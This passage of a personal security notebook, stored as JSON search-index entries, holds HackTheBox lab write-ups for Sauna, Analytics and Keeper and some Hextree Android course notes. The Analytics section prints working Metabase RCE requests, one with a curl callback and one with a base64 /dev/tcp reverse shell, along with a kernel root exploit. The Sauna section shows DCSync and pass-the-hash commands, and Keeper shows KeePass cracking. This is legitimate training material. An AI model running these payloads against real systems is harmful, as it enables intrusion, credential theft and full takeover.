us on finding vectors for further privilege escalation. Refer to the official documentation on how to do that.\nAfter marking both users as owned and executing the “Shortest Path to High Value Targets” query, we get this indicator that the svc_loanmanager user had the necessary privileges for DCSync over the domain.\nWhat’s odd here is that the guided mode didn’t accept “DCSync” as a valid answer for the current question, so I just ignored it and continued the chain.\nI then ran secretsdump to perform the DCSync attack and get the NTLM hashes from everyone.\n$ secretsdump.py -just-dc 'svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180' -outputfile \"hashes\" Single quotes are needed so bash doesn’t try to interpret the exclamation mark in the password as something else.\nGetting shell as administrator with the NT hash:\n$ evil-winrm -i \"10.129.95.180\" -u \"Administrator\" -H \"823452073d75b9d1cf70ebdf86c7f98e\" After getting the root flag, I went to take a look at the write-up to find the answers for the questions I didn’t get right.\nIn the Privilege Escalation section, in “BloodHound”, I found this image:\nI believe that this GetChangesAll and the DCSync rights are equivalent here. Probably the writer of the official write-up just used a different bloodhound version that didn’t translate the GetChangesAll permission to DCSync.\nR8: GetChangesAll\nQ9: You know that the user svc_loanmanager is able to perform a DCSync attack. By doing so, you will get the hash for the Administrator user. What is the common name of the attack that allows users to authenticate with their hashes instead of cleartext passwords? This one I just guessed by the amount of characters, but the thing is that Pass the Hash is just a term for the action of using an NT hash for authentication without having knowledge of the actual password.\nR9: Pass the Hash\nThat was the second machine of the Active Directory 101 track. It took me much less time to pwn, since it is very similar to Forest. The thing with getting the usernames from the about page and using them to attempt AS-REP roasting was cool. I had heard of this concept before and the machine was my first opportunity to put it in practice."},"title":"Sauna"},"/book/hackthebox-machines/":{"data":{"":"HackTheBox Machines are boot2root challenges where you start as an outsider and aim on going all the way to the most privileged user in a remote computer. These machines contain two flags, which are files located in the home directories of a regular user and the administrative user of the operating system. In order to finish the lab, one must gain access to and submit the contents of both the user and root flags in the platform.\nAnalytics "},"title":"HackTheBox Machines"},"/book/hackthebox-machines/analytics/":{"data":{"":"","foothold#Foothold":"The login page takes us to data.analytics.htb, which is a Metabase login page.\nAs I couldn’t find anything that could indicate the version, I just searched “metabase cve” on google and found a page containing a couple of them. I read the first one, which was an RCE registered as CVE-2023-38646 affecting metabase open-source prior to 0.46.6.1. I then searched for public exploits for the CVE and found out it involved the disclosure of a token under /api/session/properties, and fortunately, that endpoint was accessible for us.\nThen I tried finding the version on the page, and found out that it was on the range of affected versions of the CVE.\nI tried looking for the stated setup-token, and we got it there.\nFirst exploit attempt Tried running this PoC manually on burp suite, which didn’t work for me, for some reason.\nPOST /api/setup/validate HTTP/1.1 Host: data.analytical.htb Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36 Accept: application/json Content-Type: application/json Connection: close Content-Length: 558 { \"details\": { \"details\": { \"advanced-options\": true, \"classname\": \"org.h2.Driver\", \"subname\": \"mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(new String[]{\\\"sh\\\", \\\"-c\\\", cmd})\\\\;}$$\\\\;CALL SHELLEXEC('curl -d key=kh4sh3i 10.10.14.30:8000 ');\", \"subprotocol\": \"h2\" }, \"engine\": \"postgres\", \"name\": \"x\" }, \"token\": \"249fa03d-fd94-4d5b-b94f-b4ebf3df681f\" } HTTP/1.1 400 Bad Request Server: nginx/1.18.0 (Ubuntu) Date: Sun, 22 Oct 2023 06:57:59 GMT Content-Type: application/json;charset=utf-8 Content-Length: 299 Connection: close X-Frame-Options: DENY X-XSS-Protection: 1; mode=block Last-Modified: Sun, 22 Oct 2023 06:57:59 GMT Strict-Transport-Security: max-age=31536000 Set-Cookie: metabase.DEVICE=c52407c5-4f69-4e91-a934-a29a8e731c6d;HttpOnly;Path=/;Expires=Thu, 22 Oct 2043 06:57:59 GMT;SameSite=Lax X-Permitted-Cross-Domain-Policies: none Cache-Control: max-age=0, no-cache, must-revalidate, proxy-revalidate X-Content-Type-Options: nosniff Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-eval' https://maps.google.com https://accounts.google.com 'sha256-K2AkR/jTLsGV8PyzWha7/ey1iaD9c5jWRYwa++ZlMZc=' 'sha256-ib2/2v5zC6gGM6Ety7iYgBUvpy/caRX9xV/pzzV7hf0=' 'sha256-isH538cVBUY8IMlGYGbWtBwr+cGqkc4mN6nLcA7lUjE='; child-src 'self' https://accounts.google.com; style-src 'self' 'unsafe-inline' https://accounts.google.com; font-src *; img-src * 'self' data:; connect-src 'self' https://accounts.google.com metabase.us10.list-manage.com ; manifest-src 'self'; frame-ancestors 'none'; Expires: Tue, 03 Jul 2001 06:00:00 GMT {\"message\":\"IO Exception: \\\"java.io.IOException: Cannot run program \\\"\\\"javac\\\"\\\": error=2, No such file or directory\\\"; SQL statement:\\nCREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(new String[]{\\\"sh\\\", \\\"-c\\\", cmd});}$$ [90028-212]\"} Also found this interesting article about it:\nhttps://blog.calif.io/p/reproducing-cve-2023-38646-metabase?subscribe_prompt=free\nSecond exploit attempt I tried running this metasploit module located on exploits/linux/http/metabase_setup_token_rce.rb, but wasn’t able, for some reason. Probably because I lack practice with the framework itself.\nmsf6 exploit(metabase_setup_token_rce) \u003e show options Module options (exploit/metabase_setup_token_rce): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS data.analytical.htb yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The URI of the Metabase Application VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_bash): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 0.0.0.0 yes The listen address (an interface may be specified) LPORT 8000 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Target View the full module info with the info, or info -d command. msf6 exploit(metabase_setup_token_rce) \u003e rerun [*] Reloading module... [*] Started reverse TCP handler on 0.0.0.0:8000 [*] Running automatic check (\"set AutoCheck false\" to disable) [+] The target appears to be vulnerable. Version Detected: 0.46.6 [+] Found setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f [*] Sending exploit (may take a few seconds) [*] Exploit completed, but no session was created. Third exploit attempt Got shell adapting the payload from https://github.com/securezeron/CVE-2023-38646/blob/main/CVE-2023-38646-Reverse-Shell.py and sending the request with burp repeater, base64 encoding the reverse shell payload.\nPOST /api/setup/validate HTTP/1.1 Host: data.analytical.htb User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Content-Type: application/json Content-Length: 491 Connection: close { \"token\": \"249fa03d-fd94-4d5b-b94f-b4ebf3df681f\", \"details\": { \"details\": { \"db\": \"zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\\\;CREATE TRIGGER MMYAJXSA BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtYyAnMDwmMTY2LTtleGVjIDE2Njw+L2Rldi90Y3AvMTAuMTAuMTQuMzcvODAwMDtzaCA8JjE2NiA+JjE2NiAyPiYxNjYn}|{base64,-d}|{bash,-i}')\\n$$--=x\", \"advanced-options\": false, \"ssl\": true }, \"name\": \"UoZgzIaM4YAm\", \"engine\": \"h2\" } } We get a shell as user metabase.","machine-info#Machine info":" https://app.hackthebox.com/machines/569\nDifficulty: Easy OS: Linux Release date: 07 Oct, 2023 Rooted on: 02 Dec, 2023 ","root#Root":"Although root is a kernel exploit, it took me a lot of time to find the right one.\nAfter running uname -a, we get the kernel and OS version running.\nmetalytics@analytical.htb:~$ uname -a Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux I couldn’t find anything with searchsploit there, but after a couple of google searches on both Ubuntu and linux versions, I found this interesting exploit for both CVE-2023-2640 and CVE-2023-32629.\n#!/bin/bash # CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation # by g1vi https://github.com/g1vi # October 2023 echo \"[+] You should be root now\" echo \"[+] Type 'exit' to finish and leave the house cleaned\" unshare -rm sh -c \"mkdir l u w m \u0026\u0026 cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m \u0026\u0026 touch m/*;\" \u0026\u0026 u/python3 -c 'import os;os.setuid(0);os.system(\"cp /bin/bash /var/tmp/bash \u0026\u0026 chmod 4755 /var/tmp/bash \u0026\u0026 /var/tmp/bash -p \u0026\u0026 rm -rf l m u w /var/tmp/bash\")' The exploit above gives us a root shell, which leads us to the root flag under /root/root.txt.\nHere’s the website that confirmed me that this version was vulnerable:\nhttps://www.wiz.io/blog/ubuntu-overlayfs-vulnerability","user#User":" $ ls -la / total 96 drwxr-xr-x 1 root root 4096 Dec 2 04:49 . drwxr-xr-x 1 root root 4096 Dec 2 04:49 .. -rwxr-xr-x 1 root root 0 Dec 2 04:49 .dockerenv drwxr-xr-x 1 root root 4096 Jun 29 20:40 app drwxr-xr-x 1 root root 4096 Jun 29 20:39 bin drwxr-xr-x 5 root root 340 Dec 2 04:49 dev drwxr-xr-x 1 root root 4096 Dec 2 04:49 etc drwxr-xr-x 1 root root 4096 Aug 3 12:16 home drwxr-xr-x 1 root root 4096 Jun 14 15:03 lib drwxr-xr-x 5 root root 4096 Jun 14 15:03 media drwxr-xr-x 1 metabase metabase 4096 Aug 3 12:17 metabase.db drwxr-xr-x 2 root root 4096 Jun 14 15:03 mnt drwxr-xr-x 1 root root 4096 Jun 15 05:12 opt drwxrwxrwx 1 root root 4096 Aug 7 11:10 plugins dr-xr-xr-x 227 root root 0 Dec 2 04:49 proc drwx------ 1 root root 4096 Aug 3 12:26 root drwxr-xr-x 2 root root 4096 Jun 14 15:03 run drwxr-xr-x 2 root root 4096 Jun 14 15:03 sbin drwxr-xr-x 2 root root 4096 Jun 14 15:03 srv dr-xr-xr-x 13 root root 0 Dec 2 04:49 sys drwxrwxrwt 1 root root 4096 Aug 3 12:16 tmp drwxr-xr-x 1 root root 4096 Jun 29 20:39 usr drwxr-xr-x 1 root root 4096 Jun 14 15:03 var On the first look, we see the .dockerenv file indicating that we might be in a Docker container. This point also doesn’t have python, so It’d be harder to get a full tty.\nI then proceeded to look into interesting directories and files, such as /app and /home/metabase. They seemed like good candidates for finding credentials, and I actually spent a lot of time trying to poke around them, but didn’t find anything useful. So I went through HackTrick’s Linux PrivEsc guide and found these interesting environment variables:\n$ (env || set) 2\u003e/dev/null SHELL=/bin/sh MB_DB_PASS= HOSTNAME=5055712452fd LANGUAGE=en_US:en MB_JETTY_HOST=0.0.0.0 JAVA_HOME=/opt/java/openjdk MB_DB_FILE=//metabase.db/metabase.db PWD=/home/metabase LOGNAME=metabase MB_EMAIL_SMTP_USERNAME= HOME=/home/metabase LANG=en_US.UTF-8 META_USER=metalytics META_PASS=An4lytics_ds20223# MB_EMAIL_SMTP_PASSWORD= USER=metabase SHLVL=8 MB_DB_USER= FC_LANG=en-US LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib LC_CTYPE=en_US.UTF-8 MB_LDAP_BIND_DN= LC_ALL=en_US.UTF-8 MB_LDAP_PASSWORD= PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin MB_DB_CONNECTION_URI= OLDPWD=/home/metabase JAVA_VERSION=jdk-11.0.19+7 _=/usr/bin/env The credentials stored as META_USER AND META_PASS grant us ssh access as metalytics@analytical.htb, which leads to the user flag."},"title":"Analytics"},"/book/hackthebox-machines/keeper/":{"data":{"":"","footholduser#Foothold/User":"nmap shows webserver running\n┌──(k㉿box)-[~/ctfs/htb/machines/easy/Keeper] └─$ cat nmap/complete.nmap # Nmap 7.94 scan initiated Sun Dec 3 08:31:22 2023 as: nmap -sCV -p- -oN nmap/complete.nmap 10.10.11.227 Nmap scan report for keeper.htb (10.10.11.227) Host is up (0.11s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA) |_ 256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Dec 3 08:33:59 2023 -- 1 IP address (1 host up) scanned in 157.54 seconds The website asks us to go to the subdomain tickets.\nAfter adding both the keeper domain and the subdomain above to /etc/hosts, we get this login page for request tracker.\nFuzzing doesn’t show good results, just some error pages and different versions for mobile devices.\n$ ffuf -u http://tickets.keeper.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -o rtdir.txt -fc 302 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://tickets.keeper.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt :: Output file : rtdir.txt :: File format : json :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 302 ________________________________________________ m [Status: 200, Size: 2309, Words: 247, Lines: 112, Duration: 423ms] l [Status: 403, Size: 0, Words: 1, Lines: 1, Duration: 407ms] rte [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 554ms] rt [Status: 200, Size: 4236, Words: 407, Lines: 154, Duration: 549ms] [Status: 200, Size: 4236, Words: 407, Lines: 154, Duration: 564ms] rtl [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 518ms] rte-snippets [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 516ms] autohandler [Status: 403, Size: 0, Words: 1, Lines: 1, Duration: 528ms] rtf [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 490ms] rtv [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 498ms] rtm [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1007ms] rti [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1027ms] rtr [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1021ms] rtb [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1088ms] rtc [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1086ms] rtq [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1108ms] rts [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1107ms] [Status: 200, Size: 4236, Words: 407, Lines: 154, Duration: 1160ms] rt3 [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1198ms] rta [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1194ms] rtds [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1183ms] rteeditor [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1144ms] rtest [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1158ms] rtg [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1126ms] rtl2 [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1135ms] rttc [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1104ms] rtw [Status: 200, Size: 95, Words: 17, Lines: 1, Duration: 1095ms] [Status: 200, Size: 4236, Words: 407, Lines: 154, Duration: 1195ms] :: Progress: [62284/62284] :: Job [1/1] :: 35 req/sec :: Duration: [0:25:59] :: Errors: 43 :: After some research, found out that RT has default credentials root:password\nhttps://forum.bestpractical.com/t/forgot-admin-password-of-rt/33451\nWith that, we get access to an admin panel.\nI tried finding any input field where I could try uploading a reverse shell, but everything related to input or creation in general resulted in errors.\nUnder Admin \u003e Users \u003e Select, we get options for a user called lnogaard. On their page, there’s a field with their password.\nI used that password along with the username to successfully SSH into the machine.","machine-info#Machine info":" https://app.hackthebox.com/machines/556\nDifficulty: Easy OS: Linux Release date: 12 Aug, 2023 Rooted on: 15 Dec, 2023 ","root#Root":"I exfiltrated that RT30000.zip file, which contained a KeePass database and a Mini Dump crash report.\nI spent a lot of time here trying to analyze the hexdump of the .kdbx file in order to find the KeePass version, and then try looking for registered vulnerabilities for it, and after a while decided to just try running the exploits I found right away.\nI found this .NET PoC for CVE-2023-32784, that was a vuln affecting KeePass versions prior to 2.54. I followed the instructions on the documentation and ran the exploit against the mini dump file, which gave me some possible master passwords for the encrypted DB.\nUnfortunately, it doesn’t gives us the first character, and gives only a couple of possibilities for the second, but from the user page of Lnorgaard on Request Tracker, I knew that the language of this was Danish. So I used google translate to try guessing the first two characters.\nI also ran keepass2john against the .kdbx file, which gave me a hash of the master password. I could use it to try brute-forcing the first two characters and have some confirmation.\npasscodes:$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc In order to crack it with hashcat though, we just have to remove that passcodes: prefix.\nHere’s the wordlist I created using ChatGPT, assuming that the first exploit’s guess of the second character was right. I just used every single Danish alphabet character in the beginning.\naødgrød med fløde bødgrød med fløde cødgrød med fløde dødgrød med fløde eødgrød med fløde fødgrød med fløde gødgrød med fløde hødgrød med fløde iødgrød med fløde jødgrød med fløde kødgrød med fløde lødgrød med fløde mødgrød med fløde nødgrød med fløde oødgrød med fløde pødgrød med fløde qødgrød med fløde rødgrød med fløde sødgrød med fløde tødgrød med fløde uødgrød med fløde vødgrød med fløde wødgrød med fløde xødgrød med fløde yødgrød med fløde zødgrød med fløde æødgrød med fløde øødgrød med fløde åødgrød med fløde $ hashcat -m 13400 keehash.txt wordlist.txt --show $keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc:rødgrød med fløde With that, we have confirmed that the google translate suggestion was indeed right.\nNow we can use that password to open that .kdbx file using KeePassXC.\nUnder network, we have a root password, which I tried using to ssh as root, but didn’t have success.\nWe also had this strange ssh key. I googled “PUTTY” and discovered it is an ssh client, just like OpenSSH, but it has this weird format with both private and public keys in the same file.\nI pasted this note into a key.ppk file and downloaded putty for Linux, which I could then use to get root access and send the flag to my regular shell using netcat. I did that last step because somehow I couldn’t select the cat root.txt output using my cursor in the putty shell.\nThat was the machine. I found it fun to pwn, but it got really annoying in some parts. For example, I didn’t know at first that I had to use KeePassXC with .kdbx files and lost a lot of time trying to run keepass2 on it. Anyway, it was cool."},"title":"Keeper"},"/book/hextree/":{"data":{"":"The following are all my notes on the Hextree Android courses. The whole continent is available for free in https://app.hextree.io/map/android/android-continent.\nYour First Android App "},"title":"hextree"},"/book/hextree/your-first-android-app/":{"data":{"":"This course is designed to give us an introduction to Android application development. The idea here is not to become a dev, but being able to develop simple proof of concept apps that interact with the system and other applications. This knowledge is important in order to be a good Android pentester because it also allows us to see a little of the developer’s perspective.\nThe official Android Developer documentation is a great place to learn more advanced topics.\nTo start, it’s necessary to download Android Studio, set up a new emulated device and start a new project. This is all covered in the course.","challenge#Challenge":"We can start by looking at the AndroidManifest.xml file, where we see that there are two activities besides the main one.\nThose two are, however, not exported. This means that they’re not accessible from outside of the app and can only be launched by other activities within the app itself.\nIn the MainActivity code, we can see that it handles launching ChallengeActivity.\npublic class MainActivity extends AppCompatActivity { int counter = 0; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); // this is the main activity... how to get to the challenge? TextView text = findViewById(R.id.main_text); text.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { counter++; text.setText(\"Counter: \"+counter); if(counter\u003e9999) { startActivity(new Intent(MainActivity.this, ChallengeActivity.class)); } } }); } } We can see that the TextView element behaves like a button, and when it reaches a count over 9999, ChallengeActivity is launched.\nAs it’s not practical to click that many times manually, we can either change the code or launch the app in debug mode to change the variable’s value during execution. I chose the second option here.\nWe are presented with the following screen:\nFrom the activity code, we can see that most of the buttons call a failHandler function, which basically sends us back to MainActivity. The only one that does something else is button9.\npublic class ChallengeActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_challenge); // which button should you press? View.OnClickListener failHandler = new View.OnClickListener() { @Override public void onClick(View v) { startActivity(new Intent(ChallengeActivity.this, MainActivity.class)); } }; findViewById(R.id.button1).setOnClickListener(failHandler); findViewById(R.id.button2).setOnClickListener(failHandler); findViewById(R.id.button3).setOnClickListener(failHandler); findViewById(R.id.button4).setOnClickListener(failHandler); findViewById(R.id.button5).setOnClickListener(failHandler); findViewById(R.id.button6).setOnClickListener(failHandler); findViewById(R.id.button7).setOnClickListener(failHandler); findViewById(R.id.button8).setOnClickListener(failHandler); findViewById(R.id.button9).setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { startActivity(new Intent(ChallengeActivity.this, FlagActivity.class)); } }); findViewById(R.id.button10).setOnClickListener(failHandler); } } Button 9 launches FlagActivity, which contains only this weird slider.\nIt only manipulates a percentage on the screen, which starts at 50, and tells us to read the code.\nBy looking at the activity’s code, we see a onStopTrackingTouch() method that calls the decryptFlag() method when we release the slider at the 42 percentage.\nprotected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_flag); // how to reveal the flag now? TextView text = findViewById(R.id.flag_text); SeekBar bar = findViewById(R.id.seek_bar); bar.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() { @Override public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) { text.setText(\"Read the code: \"+progress+\"%\"); progressTracking = progress; } @Override public void onStartTrackingTouch(SeekBar seekBar) { } @Override public void onStopTrackingTouch(SeekBar seekBar) { // Success!!! Show the flag now! if(progressTracking==42) { text.setText(decryptFlag()); } } }); } That gives us the flag.","debugging#Debugging":"Debugging is an important knowledge, as it alows us to analyze the current state of the application in specific points. To do so, we can click at a line number to set a breakpoint and click the debug button in the top bar. This will start the application in debug mode and open the debug tab. Then, when the code reaches our breakpoint, the tab is filled with information about the app that might be useful to solve bugs.","handling-button-clicks#Handling button clicks":"We can add a button element in our activity_main layout.\nYou have to kinda mess with the constraints in order to position the button where you want, but it’s not that hard to figure it out using the graphical layout editing interface.\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003candroidx.constraintlayout.widget.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:app=\"http://schemas.android.com/apk/res-auto\" xmlns:tools=\"http://schemas.android.com/tools\" android:id=\"@+id/main\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" tools:context=\".MainActivity\"\u003e \u003cTextView android:id=\"@+id/main_text\" android:layout_width=\"251dp\" android:layout_height=\"57dp\" android:text=\"Hello World!\" android:textAlignment=\"center\" android:textSize=\"34sp\" app:layout_constraintBottom_toBottomOf=\"parent\" app:layout_constraintEnd_toEndOf=\"parent\" app:layout_constraintStart_toStartOf=\"parent\" app:layout_constraintTop_toTopOf=\"parent\" /\u003e \u003cButton android:id=\"@+id/main_button\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"Clica ai btl\" app:layout_constraintBottom_toBottomOf=\"parent\" app:layout_constraintEnd_toEndOf=\"parent\" app:layout_constraintStart_toStartOf=\"parent\" app:layout_constraintTop_toBottomOf=\"@+id/main_text\" app:layout_constraintVertical_bias=\"1.0\" /\u003e \u003c/androidx.constraintlayout.widget.ConstraintLayout\u003e Now, we can create a reference to that button in order to do something when the user clicks it. We do that in line 20 here. Then, we create a click listener, which will basically increment the value of a global variable we declared and exibit it on the screen.\nLogging stuff in the console Using Log.i() we can log messages to the console. We need to pass a tag and a message to it. Then, we can read the messages using logcat in Android Studio.\nℹ️ %d is used to format signed integers into the string. String resources Although there’s nothing wrong with our current code, Android Studio still displays these anoying warnings in some lines.\nWhen we hover on it, we see that it’s complaining about hard-coding a string. To solve that, it suggests us to “extract this hard-coded string into a resource lookup”. In order to know how to do that, we can check the official documentation.\nThere’s a section there that explains exactly how we can do that, which is not a strictly necessary action for our simple PoC applications, but is considered best practice for more advanced android app development.\nWe can simply add the string to the strings.xml file, then we can reference it in different ways accross the project.\n\u003c!-- syntax for layout files --\u003e \u003cTextView android:layout_width=\"fill_parent\" android:layout_height=\"wrap_content\" android:text=\"@string/hello\" /\u003e // syntax for code String string = getString(R.string.hello); The reason we do that is so we can easilly distribute our strings accross different languages and screen orientations. Supposing we are creating a production-grade app, if we don’t add a string to the string resources file, we would need to write the string two times, as we would have a layout for landscape and other for portrait.\nString resources also allow us to localize the app with the creation of locale-specific files. For example, we could have a res/values-pt/strings.xml for Portuguese, res/values-ja/strings.xml for Japanese, etc.\nWhen pentesting mobile applications, the strings.xml file is also a cool place to look. Sometimes developers will put sensitive information there, thinking that it’s secure just because it isn’t hard-coded.","receiving-intents#Receiving Intents":"In order to receive an intent, we can add an intent filter to a new activity in the AndroidManifest.xml file.\nFor this activity to be accessible by other apps, we need to specify exported=true.\n\u003cactivity android:name=\".SecretActivity\" android:exported=\"true\" \u003e \u003cintent-filter\u003e \u003caction android:name=\"android.intent.action.SEND\" /\u003e \u003ccategory android:name=\"android.intent.category.DEFAULT\" /\u003e \u003cdata android:mimeType=\"text/plain\" /\u003e \u003c/intent-filter\u003e \u003c/activity\u003e Elements in the intent filter:\n\u003caction\u003e: Tells Android that we want to handle intents that perform the SEND action, which is used for simple data.\n\u003ccategory\u003e: Filters for intents that use the default category. This is required in order to receive implicit intents.\n\u003cdata\u003e: Makes so only intents with extras containing data of the specified MIME type are received.\nIn the activity’s layout, I’ve added a TextView element with the debug_text id, so we can reference it later in the code.\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003candroidx.constraintlayout.widget.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:app=\"http://schemas.android.com/apk/res-auto\" xmlns:tools=\"http://schemas.android.com/tools\" android:id=\"@+id/main\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" tools:context=\".SecretActivity\"\u003e \u003cTextView android:id=\"@+id/debug_text\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"foo\" android:textSize=\"24sp\" app:layout_constraintBottom_toBottomOf=\"parent\" app:layout_constraintEnd_toEndOf=\"parent\" app:layout_constraintStart_toStartOf=\"parent\" app:layout_constraintTop_toTopOf=\"parent\" /\u003e \u003c/androidx.constraintlayout.widget.ConstraintLayout\u003e Then we can use the getIntent() function to store the intent object that lauched the activity.\npublic class SecretActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_secret); Intent receivedIntent = getIntent(); String extraText = receivedIntent.getStringExtra(Intent.EXTRA_TEXT); if (extraText != null) { TextView debugText = findViewById(R.id.debug_text); debugText.setText(\"Shared: \" + extraText); } } } We use the getStringExtra() method from the intent to store the text sent with the intent. Then, we check if the value is not null and replace the content of the debug_text element with it.\nNow, when selecting a text anywhere in the phone and clicking Share from the context menu, Android sees by our AndroidManifest that we accept receiving that intent, and then presents our app to the user as an option in the Android Sharesheet.\nWhen sharing, the text gets placed in the layout.\nNotice that activities that receive data from outside are always potential attack surfaces. When reverse engineering Android apps, it’s important to always analyze how the application handles intent data and think if we can maybe send an intent containing malicious data that could affect the user in some way.","sending-intents#Sending Intents":"In order to start a new Activity in our code, we can use the startActivity() function passing an Intent as a parameter.\nIntents are things that request Android to perform an operation. In this case, when the user clicks the button for the 10th time, we are telling Android to view a resource identified as an HTTPS URI. Then, Android goes through all the applications in the device and tries to find one that is capable of accessing resources over HTTPS, and it finds Chrome, opening it.\nChrome tells android that it wants to be used to access HTTPS resources in it’s AndroidManifest.xml file, on the snippet bellow. When the system starts searching for files to load the resource specified in the intent and finds Chrome, it sees that Chrome’s manifest file has an intent filter that is telling Android like “hey, send intents of this kind to me”. Android then starts Chrome’s activity and hands it the Intent object, which contains the data we sent. It’s then up to Chrome to handle that data.\n\u003cintent-filter\u003e \u003caction android:name=\"android.intent.action.VIEW\" /\u003e \u003ccategory android:name=\"android.intent.category.DEFAULT\" /\u003e 